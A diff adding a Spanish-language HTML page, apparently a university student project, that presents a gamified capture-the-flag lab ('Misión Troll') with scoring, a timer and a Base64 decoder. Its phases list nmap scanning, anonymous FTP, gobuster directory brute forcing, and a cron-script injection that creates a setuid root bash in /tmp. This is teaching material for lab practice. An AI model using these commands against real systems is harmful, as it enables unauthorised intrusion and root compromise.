@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Centro de Mando - Misión Troll</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Arimo:wght@400;700&family=Fira+Code:wght@400;500&family=Urbanist:wght@300;400;600;700&display=swap');
+
+        :root {
+            --primary-glow: rgba(34, 197, 94, 0.4);
+            --bg-dark: #020617;
+            --apa-margin: 2.54cm;
+        }
+
+        body {
+            font-family: 'Calibri', 'Arimo', sans-serif;
+            background-color: var(--bg-dark);
+            color: #e2e8f0;
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
+
+        /* Simulación de Margen APA 7 adaptado a Web */
+        .apa-container {
+            max-width: 1100px;
+            margin: 2rem auto;
+            padding: var(--apa-margin);
+            background: rgba(15, 23, 42, 0.6);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 8px;
+        }
+
+        /* Títulos APA */
+        h1 { font-family: 'Urbanist', sans-serif; font-size: 3rem; font-weight: 800; text-align: center; margin-bottom: 2rem; color: #f8fafc; }
+        h2 { font-size: 1.75rem; font-weight: bold; border-left: 4px solid #22c55e; padding-left: 1rem; margin-top: 3rem; margin-bottom: 1.5rem; color: #f8fafc; }
+        h3 { font-size: 1.25rem; font-weight: bold; margin-top: 1.5rem; color: #22c55e; }
+
+        /* Badges de Metadatos */
+        .meta-tag {
+            font-size: 0.65rem;
+            font-weight: 800;
+            padding: 3px 10px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-right: 5px;
+            margin-bottom: 5px;
+        }
+        .difficulty-easy { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .difficulty-medium { background: rgba(234, 179, 8, 0.15); color: #fbbf24; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .difficulty-hard { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .tag-points { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
+        .tag-time { background: rgba(168, 85, 247, 0.15); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.3); }
+
+        /* Terminal y Código */
+        .terminal-block {
+            background: #000;
+            border-radius: 8px;
+            padding: 1.25rem;
+            margin: 1.5rem 0;
+            border: 1px solid #1e293b;
+            font-family: 'Fira Code', monospace;
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 12px;
+            font-size: 0.7rem;
+            color: #64748b;
+            cursor: pointer;
+            z-index: 10;
+        }
+        .copy-btn:hover { color: #22c55e; }
+
+        /* Dashboard Flotante */
+        #mission-control {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: #1e293b;
+            padding: 1.5rem;
+            border-radius: 12px;
+            border: 1px solid #334155;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            z-index: 100;
+            width: 240px;
+        }
+
+        .phase-card {
+            transition: all 0.3s ease;
+        }
+        .phase-card.done {
+            border-color: #22c55e !important;
+            background: rgba(34, 197, 94, 0.05);
+        }
+
+        .check-box {
+            width: 22px;
+            height: 22px;
+            accent-color: #22c55e;
+            cursor: pointer;
+        }
+
+        /* Estilo para el apartado bloqueado */
+        #victory-section {
+            display: none;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 1024px) { 
+            #mission-control { position: static; width: 100%; margin: 1rem auto; } 
+            .apa-container { padding: 1.5rem; } 
+        }
+    </style>
+</head>
+<body>
+
+    <!-- DASHBOARD DE MISION AUTOMÁTICO -->
+    <div id="mission-control">
+        <div class="text-[10px] font-bold text-slate-500 uppercase mb-3 tracking-widest">Estado Operativo</div>
+        <div class="flex justify-between items-center mb-1">
+            <span class="text-xs">Puntaje Total:</span>
+            <span id="global-score" class="font-bold text-green-500 text-lg">0</span>
+        </div>
+        <div class="text-[10px] text-slate-400 mb-2">Progreso: <span id="progress-percent">0</span>%</div>
+        <div class="w-full bg-slate-800 h-2 rounded-full overflow-hidden mb-4">
+            <div id="progress-bar" class="bg-green-500 h-full w-0 transition-all duration-500 shadow-[0_0_10px_#22c55e]"></div>
+        </div>
+        <div class="text-center border-t border-slate-700 pt-3">
+            <div id="stopwatch" class="font-mono text-2xl font-bold text-white mb-2 tracking-tighter">00:00:00</div>
+            <button onclick="toggleTimer()" id="timer-btn" class="w-full bg-green-600 hover:bg-green-700 text-white text-[10px] py-2 rounded font-bold uppercase tracking-widest transition-colors">Iniciar Lab</button>
+        </div>
+    </div>
+
+    <div class="apa-container shadow-2xl">
+        <header class="text-center mb-16 border-b border-slate-800 pb-10">
+            <div class="text-xs font-bold text-green-500 mb-2 uppercase tracking-[0.3em]">Universidad de Cundinamarca</div>
+            <h1>CENTRO DE MANDO <span class="text-green-500">TROLL</span></h1>
+            <div class="flex justify-center gap-6 text-[10px] text-slate-500 font-mono">
+                <span>ANA MARIA CORTES</span> | <span>JULIAN MORENO RAMIREZ</span> | <span>2026</span>
+            </div>
+        </header>
+
+        <!-- SECCIÓN DE APRENDIZAJES -->
+        <section id="aprendizajes" class="mb-20">
+            <h2>Habilidades Técnicas a Validar</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="p-5 bg-slate-900/40 border border-slate-800 rounded-lg group hover:border-green-500/50 transition-colors">
+                    <h3 class="mt-0 text-sm">Reconocimiento y Enumeración</h3>
+                    <p class="text-xs text-slate-400">Identificación de servicios Nmap y escaneo de protocolos (21, 22, 80).</p>
+                </div>
+                <div class="p-5 bg-slate-900/40 border border-slate-800 rounded-lg group hover:border-green-500/50 transition-colors">
+                    <h3 class="mt-0 text-sm">Análisis Forense y Correlación</h3>
+                    <p class="text-xs text-slate-400">Decodificación Base64 y reconstrucción de credenciales fragmentadas.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- HERRAMIENTA: DECODIFICADOR BASE64 -->
+        <section id="decoder-tool" class="mb-20">
+            <h2>Herramienta Táctica: Decodificador Base64</h2>
+            <div class="p-6 bg-slate-900 border border-slate-700 rounded-xl">
+                <p class="text-xs text-slate-400 mb-4 italic">Utiliza este módulo para interpretar las flags ofuscadas durante la misión.</p>
+                <div class="flex flex-col sm:flex-row gap-3">
+                    <input type="text" id="b64-input" placeholder="Introduce cadena Base64..." class="flex-1 bg-black border border-slate-600 rounded px-4 py-2 text-sm font-mono text-green-400 focus:border-green-500 outline-none">
+                    <button onclick="decodeBase64()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded text-xs font-bold uppercase transition-all">Decodificar</button>
+                </div>
+                <div id="b64-output-container" class="mt-4 p-4 bg-black/50 border border-green-900/30 rounded hidden">
+                    <span class="text-[10px] text-slate-500 block mb-1">RESULTADO:</span>
+                    <div id="b64-output" class="text-green-500 font-mono text-sm break-all"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FASES DE EXPLOTACIÓN -->
+        <h2>Secuencia de Objetivos Técnicos</h2>
+
+        <!-- Fase 1 -->
+        <div class="phase-card p-6 border border-slate-800 rounded-xl mb-8 bg-slate-900/20" id="p1">
+            <div class="flex justify-between items-start">
+                <div class="mb-4">
+                    <span class="meta-tag difficulty-easy"><i class="fa-solid fa-signal"></i> Fácil</span>
+                    <span class="meta-tag tag-points">10 pts</span>
+                    <span class="meta-tag tag-time">10 min</span>
+                    <h3 class="mt-2 text-xl">01. Descubrimiento de Red (Nmap)</h3>
+                </div>
+                <input type="checkbox" class="check-box" data-pts="10" onchange="updateMission('p1', this)">
+            </div>
+            <p class="text-sm text-slate-400 mb-4">Identifica los servicios expuestos en el host objetivo.</p>
+            <div class="terminal-block">
+                <span class="copy-btn" onclick="copyText('nmap -sC -sV -A 192.168.56.113')">COPIAR</span>
+                <code class="text-green-400">nmap -sC -sV -A target_ip</code>
+            </div>
+        </div>
+
+        <!-- Fase 2 -->
+        <div class="phase-card p-6 border border-slate-800 rounded-xl mb-8 bg-slate-900/20" id="p2">
+            <div class="flex justify-between items-start">
+                <div class="mb-4">
+                    <span class="meta-tag difficulty-easy"><i class="fa-solid fa-folder-open"></i> Fácil</span>
+                    <span class="meta-tag tag-points">20 pts</span>
+                    <span class="meta-tag tag-time">5 min</span>
+                    <h3 class="mt-2 text-xl">02. Enumeración FTP Anónimo</h3>
+                </div>
+                <input type="checkbox" class="check-box" data-pts="20" onchange="updateMission('p2', this)">
+            </div>
+            <div class="terminal-block">
+                <code class="text-green-400">ftp target_ip<br>Name: anonymous | Pass: [enter]<br>get flag1.txt</code>
+            </div>
+        </div>
+
+        <!-- Fase 3-7 -->
+        <div class="phase-card p-6 border border-slate-800 rounded-xl mb-8 bg-slate-900/20" id="p3">
+            <div class="flex justify-between items-start">
+                <div class="mb-4">
+                    <span class="meta-tag difficulty-medium"><i class="fa-solid fa-code"></i> Media</span>
+                    <span class="meta-tag tag-points">140 pts</span>
+                    <span class="meta-tag tag-time">55 min</span>
+                    <h3 class="mt-2 text-xl">03-07. Análisis Web y Fuzzing</h3>
+                </div>
+                <input type="checkbox" class="check-box" data-pts="140" onchange="updateMission('p3', this)">
+            </div>
+            <p class="text-sm text-slate-400 mb-4">Decodifica la flag1 y realiza fuerza bruta de directorios para hallar <code>/.hidden_dev</code>.</p>
+            <div class="terminal-block">
+                <code class="text-green-400">gobuster dir -u http://target_ip -w common.txt -x txt</code>
+            </div>
+        </div>
+
+        <!-- Fase 8-10 -->
+        <div class="phase-card p-6 border border-slate-800 rounded-xl mb-8 bg-slate-900/20" id="p4">
+            <div class="flex justify-between items-start">
+                <div class="mb-4">
+                    <span class="meta-tag difficulty-medium"><i class="fa-solid fa-key"></i> Media</span>
+                    <span class="meta-tag tag-points">150 pts</span>
+                    <span class="meta-tag tag-time">40 min</span>
+                    <h3 class="mt-2 text-xl">08-10. Acceso SSH y Escalada</h3>
+                </div>
+                <input type="checkbox" class="check-box" data-pts="150" onchange="updateMission('p4', this)">
+            </div>
+            <p class="text-sm text-slate-400 mb-4">Anula el <code>TMOUT</code> en <code>/etc/profile.d/timer.sh</code> e inyecta la shell en el script de cron.</p>
+            <div class="terminal-block">
+                <code class="text-green-400">echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > /home/dev/script.sh</code>
+            </div>
+        </div>
+
+        <!-- Fase Final -->
+        <div class="phase-card p-6 border border-slate-800 rounded-xl mb-8 bg-slate-900/20" id="p5">
+            <div class="flex justify-between items-start">
+                <div class="mb-4">
+                    <span class="meta-tag difficulty-hard"><i class="fa-solid fa-skull-crossbones"></i> Difícil</span>
+                    <span class="meta-tag tag-points">150 pts</span>
+                    <span class="meta-tag tag-time">15 min</span>
+                    <h3 class="mt-2 text-xl">11. Activación de Target Gráfico</h3>
+                </div>
+                <input type="checkbox" class="check-box" data-pts="150" onchange="updateMission('p5', this)">
+            </div>
+            <div class="terminal-block">
+                <code class="text-green-400">sudo systemctl unmask gdm3<br>sudo systemctl isolate graphical.target</code>
+            </div>
+        </div>
+
+        <!-- APARTADO BLOQUEADO: VICTORIA -->
+        <section id="victory-section" class="mt-20 border-t-2 border-green-500 pt-10 text-center">
+            <div class="inline-block p-2 bg-green-500 text-black font-bold text-xs px-4 mb-6 uppercase tracking-widest">Misión Cumplida</div>
+            <h2 class="border-none text-4xl mb-6">¡Laboratorio Troll Neutralizado!</h2>
+            <div class="max-w-2xl mx-auto rounded-2xl overflow-hidden border-4 border-green-500/30 shadow-[0_0_30px_rgba(34,197,94,0.2)]">
+                            </div>
+            <p class="mt-6 text-slate-400 text-sm italic">Has demostrado atención al detalle, capacidad analítica y dominio de la infraestructura Linux.</p>
+        </section>
+
+        <!-- REFERENCIAS -->
+        <div class="mt-24 pt-10 border-t border-slate-800 text-[10px] text-slate-600 italic">
+            <p class="mb-2">Santamaria Cedeño, E. V., et al. (2025). La dependencia de la tecnología en el desarrollo cognitivo. Ciencia Y Educación.</p>
+            <p>Universidad de Cundinamarca. (2025). Guía resumen normas APA: Séptima edición. Centro de Gestión del Conocimiento y el Aprendizaje.</p>
+        </div>
+    </div>
+
+    <script>
+        let score = 0;
+        let seconds = 0;
+        let timerActive = false;
+        let interval = null;
+        const totalSteps = document.querySelectorAll('.check-box').length;
+
+        function updateMission(id, el) {
+            const card = document.getElementById(id);
+            const pts = parseInt(el.getAttribute('data-pts'));
+            
+            // Si es el primer check, iniciamos el timer automáticamente
+            if(!timerActive && el.checked) toggleTimer();
+
+            if(el.checked) {
+                card.classList.add('done');
+                score += pts;
+            } else {
+                card.classList.remove('done');
+                score -= pts;
+            }
+            
+            // Actualizar UI
+            document.getElementById('global-score').innerText = score;
+            const checkedCount = document.querySelectorAll('.check-box:checked').length;
+            const percent = Math.round((checkedCount / totalSteps) * 100);
+            document.getElementById('progress-bar').style.width = percent + '%';
+            document.getElementById('progress-percent').innerText = percent;
+
+            // Verificar Victoria
+            if(percent === 100) {
+                document.getElementById('victory-section').style.display = 'block';
+                if(timerActive) toggleTimer(); // Detener al completar
+            } else {
+                document.getElementById('victory-section').style.display = 'none';
+            }
+        }
+
+        function decodeBase64() {
+            const input = document.getElementById('b64-input').value;
+            const container = document.getElementById('b64-output-container');
+            const output = document.getElementById('b64-output');
+            try {
+                output.innerText = atob(input.trim());
+                container.classList.remove('hidden');
+            } catch(e) {
+                output.innerText = "ERROR: Cadena Base64 no válida.";
+                container.classList.remove('hidden');
+            }
+        }
+
+        function toggleTimer() {
+            const btn = document.getElementById('timer-btn');
+            if(timerActive) {
+                clearInterval(interval);
+                btn.innerText = "Reanudar Lab";
+                btn.className = "w-full bg-slate-700 text-white text-[10px] py-2 rounded font-bold uppercase tracking-widest";
+            } else {
+                interval = setInterval(() => {
+                    seconds++;
+                    const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
+                    const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+                    const s = String(seconds % 60).padStart(2, '0');
+                    document.getElementById('stopwatch').innerText = `${h}:${m}:${s}`;
+                }, 1000);
+                btn.innerText = "Pausar Lab";
+                btn.className = "w-full bg-red-600 text-white text-[10px] py-2 rounded font-bold uppercase tracking-widest";
+            }
+            timerActive = !timerActive;
+        }
+
+        function copyText(txt) {
+            const area = document.createElement('textarea');
+            area.value = txt;
+            document.body.appendChild(area);
+            area.select();
+            document.execCommand('copy');
+            document.body.removeChild(area);
+            // Pequeña notificación visual
+            const msg = document.createElement('div');
+            msg.innerText = "Comando Copiado";
+            msg.className = "fixed top-10 left-1/2 -translate-x-1/2 bg-green-500 text-black font-bold px-4 py-2 rounded shadow-lg text-xs z-[200]";
+            document.body.appendChild(msg);
+            setTimeout(() => msg.remove(), 2000);
+        }
+    </script>
+</body>
+</html>
